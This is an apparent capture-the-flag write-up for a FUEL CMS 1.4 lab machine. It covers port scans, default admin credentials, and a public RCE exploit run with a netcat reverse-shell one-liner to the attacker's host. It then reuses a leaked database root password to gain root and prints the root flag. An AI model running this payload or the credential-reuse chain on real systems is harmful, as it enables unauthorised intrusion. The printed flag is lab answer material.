Quick port scan
```bash
nmap -p- --min-rate=10000 10.10.242.232
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 21:15 EEST
Warning: 10.10.242.232 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.242.232
Host is up (0.23s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.66 seconds
                                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 80 -sC -sV 10.10.242.232       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-24 21:15 EEST
Nmap scan report for 10.10.242.232
Host is up (0.27s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/fuel/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.63 seconds
```

The website has some sort of credentials in it 
```bash

That's it!

To access the FUEL admin, go to:
http://10.10.242.232/fuel
User name: admin
Password: admin (you can and should change this password and admin user information after logging in)

```

The website is FUEL 1.4 and there is an RCE exploit for it. I had trouble making it work since the machine is quite old and i had to use very old scripts that only worked on python2

https://www.exploit-db.com/exploits/47138

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python2 47138.py
cmd:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.6.25.159 4444 >/tmp/f"
```

We were able to get the flag and I imported the linpeas over to automate the enumration.

We got the SQL logins
```bash
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
```

I was searching the mysql for a while with the user but with no success. Then I figured that we got the root and the password for it why wouldnt it work for logging in?? and boom i got the root. I pretty much wasted 10 minutes of my life looking at useless sql data.
```bash
root@ubuntu:/var/www/html# cat /root/root.txt
cat /root/root.txt
b9bbcb33e11b80be759c4e844862482d 
```
